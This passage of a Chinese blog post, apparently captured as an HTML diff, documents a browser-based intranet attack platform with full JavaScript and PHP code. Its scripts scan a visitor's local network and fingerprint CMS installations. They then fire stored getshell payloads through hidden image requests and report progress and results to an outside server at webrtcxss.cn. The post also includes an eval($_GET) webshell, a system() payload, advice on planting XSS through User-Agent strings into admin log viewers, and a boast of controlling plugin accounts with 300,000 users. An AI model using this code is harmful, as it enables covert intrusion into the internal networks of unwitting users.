class="built_in">arguments</span>.callee,<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
+<p>这就是为什么我之前要把80端口不存在的IP放到一个数组变量里，存在80端口的IP放到一个数组变量里。因为我不确定他们什么时候好，之前说的9.1分钟，只是一个大概时间，因电脑配置、内网通讯速度等其他的原因可能会提前，也可能会更慢。我无法做出保证。所以写了一段代码。下面我来说说这段代码的意思：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*coding*/</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
+<p>是一段匿名函数，当代码运行到此处时会立刻执行此函数。<br>函数里面首先是判断deathIpLIst.length + survivalIpLIst.length是否等于254。如果等于254则调用snedIteratesIpData函数，并把开启80端口并运行站点的IP作为参数发送过去。如果不等于说明浏览器还没有把所有的图片都给判断好。进入else分之。<br><code>setTimeout(arguments.callee,5000);</code>是延迟5秒钟运行arguments.callee。而arguments.callee的意思是当前函数。我们来实际看下：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/6.png" alt=""></p>
+<p>console.log打印了当前的函数，当然你也可以使用setTimeout(当前的函数名(),5000);来达到此效果，但是此方法对于匿名函数没有用。因为匿名函数是不存在名称的。如果学了递归的朋友们，应该会很好理解。<br>说通俗点就是：每隔5秒钟运行此函数，直到所有img标签全部判断完成，才进行下一步的操作。</p>
+<blockquote>
+<h3 id="0x05确认内网存活主机的CMS信息："><a href="#0x05确认内网存活主机的CMS信息：" class="headerlink" title="0x05确认内网存活主机的CMS信息："></a>0x05确认内网存活主机的CMS信息：</h3></blockquote>
+<p>上一节我们说到闭包里的if条件里true执行的snedIteratesIpData函数，现在我们就来说说这个函数里面是什么内容：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">snedIteratesIpData</span>(<span class="params">ip</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(deathIpLIst.length == <span class="number">254</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stage(<span class="number">2</span>)</span><br><span class="line">    ip = ip.join(<span class="string">"-"</span>)</span><br><span class="line">    ipAjax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    ipAjax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ipAjax.readyState == <span class="number">4</span> &amp;&amp; ipAjax.status == <span class="number">200</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> cmsPath = <span class="built_in">JSON</span>.parse(ipAjax.responseText).path;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> cmsPath)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; survivalIpLIst.length;i++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">                    scriptTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + survivalIpLIst[i] + cmsPath[key]);</span><br><span class="line">                    scriptTag.setAttribute(<span class="string">"data-ipadder"</span>,survivalIpLIst[i]);</span><br><span class="line">                    scriptTag.setAttribute(<span class="string">"data-cmsinfo"</span>,key);</span><br><span class="line">                    scriptTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:vulnerabilityIpList(this)"</span>);</span><br><span class="line">                    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(scriptTag);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ipAjax.open(<span class="string">'POST'</span>, snedIteratesIpUrl, <span class="literal">false</span>);</span><br><span class="line">    ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    ipAjax.send(<span class="string">'iplist='</span>+ip+<span class="string">'&amp;onlystring='</span>+onlyString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>为什么要在函数开始前写上if函数呢，因为在上一节中的闭包里存在一个bug。就是当所有内网IP中都没有开放80端口且不存在站点的情况下，deathIpLIst.length会为254。而survivalIpLIst.length会为0。那<code>deathIpLIst.length + survivalIpLIst.length == 254</code>的条件是为true的。为了避免此bug的发生，我们在snedIteratesIpData函数里加入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(deathIpLIst.length == <span class="number">254</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>当deathIpLIst.length等于254的时候，返回false。不再向下执行。因为所有代码的构架就是A调用B，C调用A，D调用C。当C返回false的时候，D是不会执行的。从上面的代码可以看到，返回false后。下面的代码都不会运行的。<br>现在我们来看下<code>ip = ip.join(&quot;-&quot;)</code>这条代码的意思，是当内网中存在两条（包括两条）以上的IP地址时，使用join函数，传给服务端。方便服务端的接受及查看。服务端的反馈就像下面这样：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/7.png" alt=""></p>
+<p>面来说说ajax请求的代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ipAjax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">ipAjax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ipAjax.readyState == <span class="number">4</span> &amp;&amp; ipAjax.status == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> cmsPath = <span class="built_in">JSON</span>.parse(ipAjax.responseText).path;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> cmsPath)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; survivalIpLIst.length;i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">                scriptTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span> + survivalIpLIst[i] + cmsPath[key]);</span><br><span class="line">                scriptTag.setAttribute(<span class="string">"data-ipadder"</span>,survivalIpLIst[i]);</span><br><span class="line">                scriptTag.setAttribute(<span class="string">"data-cmsinfo"</span>,key);</span><br><span class="line">                scriptTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:vulnerabilityIpList(this)"</span>);</span><br><span class="line">                <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(scriptTag);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ipAjax.open(<span class="string">'POST'</span>, snedIteratesIpUrl, <span class="literal">false</span>);</span><br><span class="line">ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">ipAjax.send(<span class="string">'iplist='</span>+ip+<span class="string">'&amp;onlystring='</span>+onlyString);</span><br></pre></td></tr></table></figure></p>
+<p>发送内网中开放80端口且具有站点的ip地址，并同时发送唯一标识符。用于服务端验证。<br>服务端接受后，发送json数据，服务端代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;ajaxReturn(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"typeMsg"</span> =&gt; <span class="string">"success"</span>,</span><br><span class="line">    <span class="string">"path"</span>    =&gt; $pathInfo,</span><br><span class="line">));</span><br></pre></td></tr></table></figure></p>
+<p>然后使用if(ipAjax.readyState == 4 &amp;&amp; ipAjax.status == 200)来判断是否发送成功，成功后，把json里的path数据赋值cmsPath变量。用于后面的代码调用。首先进入for循环，cmsPath[‘key’]为当前的cms路径。然后再来套一个for循环，survivalIpLIst[i]为当前循环的IP地址。<br>接下来就是建立一个script标签的DOM元素，其中的data-ipadder、data-cmsinfo是为了让后面的代码方便调用。<code>onload = &quot; javascript:vulnerabilityIpList(this)&quot;</code>是当这个地址存在的时候，调用的一个函数，下一节会说到。<br>现在先让我们看看数据库在的cmsPath是什么样的把：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/8.png" alt=""></p>
+<p>默认就这4个，更多的路径可以自行加入。<br>为了方便测试，我在我家中的另一台电脑上部署了代码，只有index.php、/static/bbcode.js、vul/heihei.php、favicon.ico这几个文件。而在heihei.php文件里代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>为什么是这个呢，很简单。我手里面没有Discuz的getshell漏洞。为了徒省事。就这样把。而favicon.ico文件我也很随意的使用了dedecms的favicon.ico。后面测试的时候，还望不要见怪。<br>现在我们来运行下代码看下会发生什么事情吧：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/9.png" alt=""></p>
+<p>我在/static/bbcode.js文件里写入的是console.log(1)所有会在控制台反馈1。这只是测试的代码，真实的环境是不会这样的。现在我们来看下DOM元素有些改变把：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/10.png" alt=""></p>
+<p>已经调用了，程序检测到只有<a href="http://192.168.1.103/static/js/bbcode.js符合。那么一旦成功调用js文件，就会执行onlod里的vulnerabilityIpList(this)代码。而vulnerabilityIpList函数代码就在下一节。" target="_blank" rel="external">http://192.168.1.103/static/js/bbcode.js符合。那么一旦成功调用js文件，就会执行onlod里的vulnerabilityIpList(this)代码。而vulnerabilityIpList函数代码就在下一节。</a></p>
+<blockquote>
+<h3 id="0x06-检测内网主机中的漏洞是否真实存在（上篇）："><a href="#0x06-检测内网主机中的漏洞是否真实存在（上篇）：" class="headerlink" title="0x06 检测内网主机中的漏洞是否真实存在（上篇）："></a>0x06 检测内网主机中的漏洞是否真实存在（上篇）：</h3></blockquote>
+<p>下面就是vulnerabilityIpList函数的代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">vulnerabilityIpList</span>(<span class="params">info</span>)</span>&#123;</span><br><span class="line">    stage(<span class="number">3</span>)</span><br><span class="line">    ipAjax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    ipAjax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ipAjax.readyState == <span class="number">4</span> &amp;&amp; ipAjax.status == <span class="number">200</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> vulCmsInfo = ipAjax.responseText;</span><br><span class="line">            <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">            img.setAttribute(<span class="string">"scr"</span>,vulCmsInfo);</span><br><span class="line">            img.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</span><br><span class="line">            <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(img);</span><br><span class="line">            setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">                scriptTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span>+info.getAttribute(<span class="string">'data-ipadder'</span>)+<span class="string">"/1.js"</span>);</span><br><span class="line">                scriptTag.setAttribute(<span class="string">"data-cmsinfo"</span>,info.getAttribute(<span class="string">"data-cmsinfo"</span>));</span><br><span class="line">                scriptTag.setAttribute(<span class="string">"data-vulip"</span>,info.getAttribute(<span class="string">'data-ipadder'</span>));</span><br><span class="line">                scriptTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:vulConfirm(this)"</span>);</span><br><span class="line">                <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(scriptTag);</span><br><span class="line">            &#125;,<span class="number">2000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ipAjax.open(<span class="string">'POST'</span>, snedIteratesCmsIpUrl, <span class="literal">false</span>);</span><br><span class="line">    ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    ipAjax.send(<span class="string">'existenceCmsIp='</span>+ info.getAttribute(<span class="string">"data-ipadder"</span>) + <span class="string">'&amp;existenceCmsInfo='</span> + info.getAttribute(<span class="string">"data-cmsinfo"</span>) + <span class="string">'&amp;onlystring='</span> + onlyString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中info参数是成功调用的script标签的DOM元素对象。<br>首先让我们看下发送url的请求：</p>
+<ol>
+<li><p>existenceCmsIp参数是检测到cms类型的IP地址</p>
+</li>
+<li><p>existenceCmsInfo参数是检测到cms类型</p>
+</li>
+<li><p>onlystring参数是唯一标识符，用于服务器判断属于哪一个项目。</p>
+</li>
+</ol>
+<p>接下来让我们看下onreadystatechange里面的内容：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vulCmsInfo = ipAjax.responseText;</span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.setAttribute(<span class="string">"scr"</span>,vulCmsInfo);</span><br><span class="line">img.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(img);</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> scriptTag = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">    scriptTag.setAttribute(<span class="string">"src"</span>,<span class="string">"http://"</span>+info.getAttribute(<span class="string">'data-ipadder'</span>)+<span class="string">"/1.js"</span>);</span><br><span class="line">    scriptTag.setAttribute(<span class="string">"data-cmsinfo"</span>,info.getAttribute(<span class="string">"data-cmsinfo"</span>));</span><br><span class="line">    scriptTag.setAttribute(<span class="string">"data-vulip"</span>,info.getAttribute(<span class="string">'data-ipadder'</span>));</span><br><span class="line">    scriptTag.setAttribute(<span class="string">"onload"</span>,<span class="string">"javascript:vulConfirm(this)"</span>);</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(scriptTag);</span><br><span class="line">&#125;,<span class="number">2000</span>);</span><br></pre></td></tr></table></figure></p>
+<p>首先就是var vulCmsInfo = ipAjax.responseText;，把服务器返回的字符串赋值给vulCmsInfo变量。服务端的代码是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">* 把客户端检测到存在CMS的IP加入到数据库中</span><br><span class="line">*/</span></span><br><span class="line"><span class="keyword">if</span>(I(<span class="string">'post.existenceCmsIp'</span>)  == <span class="string">""</span> || I(<span class="string">'post.existenceCmsInfo'</span>) == <span class="string">""</span> || I(<span class="string">'post.onlystring'</span>) == <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ajaxReturn(<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"typeMsg"</span> =&gt; <span class="string">"error"</span>,</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br><span class="line">$existenceCmsIp               = I(<span class="string">'post.existenceCmsIp'</span>);</span><br><span class="line">$existenceCmsInfo             = I(<span class="string">'post.existenceCmsInfo'</span>);</span><br><span class="line">$onlyString                   = I(<span class="string">'post.onlystring'</span>);</span><br><span class="line">$existencecmsip               = M(<span class="string">'existencecmsip'</span>);</span><br><span class="line">$existenceData[<span class="string">'inner_ip'</span>]    = $existenceCmsIp;</span><br><span class="line">$existenceData[<span class="string">'cms'</span>]         = $existenceCmsInfo;</span><br><span class="line">$existenceData[<span class="string">'onlystring'</span>] = $onlyString;</span><br><span class="line">$existenceData[<span class="string">'create_time'</span>] = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">$existencecmsip-&gt;data($existenceData)-&gt;add();</span><br><span class="line"><span class="comment">/*</span><br><span class="line">* 获取数据库中的cms漏洞详情，发送给客户端</span><br><span class="line">*/</span></span><br><span class="line">$cmsvul  = M(<span class="string">'cmsvul'</span>);</span><br><span class="line">$vulInfo = base64_decode($cmsvul-&gt;where(<span class="string">'cms="'</span>.$existenceCmsInfo.<span class="string">'"'</span>)-&gt;getField(<span class="string">"vulinfo"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"http://"</span>.$existenceCmsIp.$vulInfo;从代码中可以看到服务端返回的不是json数据，而是字符串，这个字符串是拼接好的url。这个url就是从获取到的IP地址加上服务器中调用属于cms漏洞的path路径。</span><br></pre></td></tr></table></figure></p>
+<p>然后使用img标签来发送get请求，用于触发此getshell漏洞。代码也就是：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.setAttribute(<span class="string">"scr"</span>,vulCmsInfo);</span><br><span class="line">img.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(img);</span><br></pre></td></tr></table></figure></p>
+<p>至于为什么要使用setTimeout函数来延迟2秒钟执行，是因为之前也说过浏览器是无法同时判断那么多的img请求。因为这里只有一个所以我使用了2秒，真实情况下可以改为20秒。<br>然后建立一个script标签，用于判断1.js是否生成成功，如果生成成功，就说明漏洞存在，交给下一个函数处理，如果不存在，就此打住。因为onload不会调用vulConfirm函数。<br>至于为什么要判断1.js文件，就是我之前所说的getshell生成的代码。在数据中是这样的：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/11.png" alt=""></p>
+<p>是一段base64密文，解开后，内容如下：<code>/vul/heihei.php?a=system(&#39;echo 1 &gt;&gt; ../1.js&#39;);</code><br>而在后端发送给前端的时候，我已经解密了。如同上面代码中：<br><code>$vulInfo = base64_decode($cmsvul-&gt;where(&#39;cms=&quot;&#39;.$existenceCmsInfo.&#39;&quot;&#39;)-&gt;getField(&quot;vulinfo&quot;));</code><br>而在浏览器中代码是这样：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/12.png" alt=""></p>
+<p>接下来就是setTimeout函数的真正的用处了。请注意这段代码：<br><code>scriptTag.setAttribute(&quot;src&quot;,&quot;http://&quot;+info.getAttribute(&#39;data-ipadder&#39;)+&quot;/1.js&quot;);</code><br>在script中把src的赋值成检测目标站点是否存在1.js。如果存在就运行onload里的vulConfirm函数。而vulConfirm函数就在下一节。</p>
+<blockquote>
+<h3 id="0x07-检测内网主机中的漏洞是否真实存在（下篇）："><a href="#0x07-检测内网主机中的漏洞是否真实存在（下篇）：" class="headerlink" title="0x07 检测内网主机中的漏洞是否真实存在（下篇）："></a>0x07 检测内网主机中的漏洞是否真实存在（下篇）：</h3></blockquote>
+<p>vulConfirm函数的内容很简单，只有给服务端发送的代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">vulConfirm</span>(<span class="params">cmsConfirmInfo</span>)</span>&#123;</span><br><span class="line">    stage(<span class="number">4</span>)</span><br><span class="line">    ipAjax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    ipAjax.open(<span class="string">'POST'</span>, sendExistenceVul, <span class="literal">false</span>);</span><br><span class="line">    ipAjax.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    ipAjax.send(<span class="string">'cms='</span>+ cmsConfirmInfo.getAttribute(<span class="string">"data-cmsinfo"</span>) + <span class="string">'&amp;vulip='</span>+ cmsConfirmInfo.getAttribute(<span class="string">"data-vulip"</span>) +<span class="string">'&amp;onlystring='</span> + onlyString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li>cms参数是存在漏洞的CMS信息</li>
+<li>vulip是存在漏洞的IP地址</li>
+<li>onlystring是唯一标识符，用于服务端判断</li>
+</ol>
+<blockquote>
+<h3 id="0x08-stage的作用："><a href="#0x08-stage的作用：" class="headerlink" title="0x08 stage的作用："></a>0x08 stage的作用：</h3></blockquote>
+<p>stage函数代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stage</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> updataStage = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">    updataStage.setAttribute(<span class="string">"src"</span>,<span class="string">"http://webrtcxss.cn/Api/stage/onlystring/"</span>+onlyString+<span class="string">"/updata/"</span>+num);</span><br><span class="line">    updataStage.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none;"</span>);</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(updataStage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>就是一个img标签，发送get请求到服务端，告诉服务端代码运行到哪里了。在平台中的反馈如图：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/13.png" alt=""></p>
+<blockquote>
+<h3 id="0x09-API后端代码："><a href="#0x09-API后端代码：" class="headerlink" title="0x09 API后端代码："></a>0x09 API后端代码：</h3></blockquote>
+<p>后端使用了thinkphp框架。如果你想修改服务端接受的方式的话。<br>请在/Application/Home/Controller目录下修改ApiController.class.php文件，就行了。里面的内容分为survivalIp、survivalPortIp、_empty、survivalCmsIp、existenceVul、stage模块。可根据JavaScript中的代码来做出相应的修改。如图：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/14.png" alt=""></p>
+<blockquote>
+<h3 id="0x10平台专属的API："><a href="#0x10平台专属的API：" class="headerlink" title="0x10平台专属的API："></a>0x10平台专属的API：</h3></blockquote>
+<p>平台的api在<code>/Application/Home/Controller</code>目录下的RootApiController.class.php文件里。<br>建立项目、删除项目、查询项目都在里面。如果你想修改JavaScript代码，就在建立项目中修改，如图：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/15.png" alt=""></p>
+<p>修改起来很简单。<br>平台运行起来如下图：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/16.png" alt=""></p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/17.png" alt=""></p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/18.png" alt=""></p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/19.png" alt=""></p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/20.png" alt=""></p>
+<blockquote>
+<h3 id="0x11数据库的结构："><a href="#0x11数据库的结构：" class="headerlink" title="0x11数据库的结构："></a>0x11数据库的结构：</h3></blockquote>
+<p>一共具有7个表，如下：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/21.png" alt=""></p>
+<ol>
+<li><code>webrtc_cmspath</code>用于存放检测cms类型的JavaScript路径</li>
+<li><code>webrtc_cmsvul用于存放cms</code>的getshell漏洞详情</li>
+<li><code>webrtc_existencecmsip</code>用于存放内网中哪些IP具有cms</li>
+<li><code>webrtc_existencevul</code>用于存放内网中哪些IP具有的CMS有漏洞</li>
+<li><code>webrtc_ipdatalist</code>用于存放内网中所有开放80端口切具有站点的ip列表</li>
+<li><code>webrtc_project</code>用于存放项目信息</li>
+<li><code>webrtc_survivaliplist</code>用于存放当前主机的内网ip</li>
+</ol>
+<blockquote>
+<h3 id="0x12特殊的玩法："><a href="#0x12特殊的玩法：" class="headerlink" title="0x12特殊的玩法："></a>0x12特殊的玩法：</h3></blockquote>
+<p>之前在freebuf说过了，地址是：<a href="http://www.freebuf.com/articles/web/61268.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/61268.html</a><br>因为nginx或者apache有些管理员会使用日志看实时查看网站的流量，由于log日志看起来太丑，于是就有人想出web端实时的反馈网站流量。但是在记录user-agent等数据包格式的时候，没有做好过滤。从而导致攻击者修改自己的user-agent为XSS攻击字符串，再进行浏览网站的操作，网站管理员在查看的时候就会触发XSS，如果配合本章所讲的内容。就像下雨天吃着巧克力一样完美。其实并不一定非要是nginx或者apache，有些网站的后台写的程序中会使用后端语言而非nginx这种配置生成文件，他们会直接记录下你们的IP、user-agent。从而在后台方便查看。这个时候我们本章所说的内容就会排上用场。<br>关于插件安全的话，请大家看下面这张图：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/22.png" alt=""></p>
+<p>我控制了十多个maxthon插件作者的账户，现在具有30w的插件用户，而我可以随时随地的更改其中的代码，而我问了一下maxthon插件的官方人员，答复是：</p>
+<p><img src="http://7xppwd.com1.z0.glb.clouddn.com/automated-intrusion-inner-network/23.png" alt=""></p>
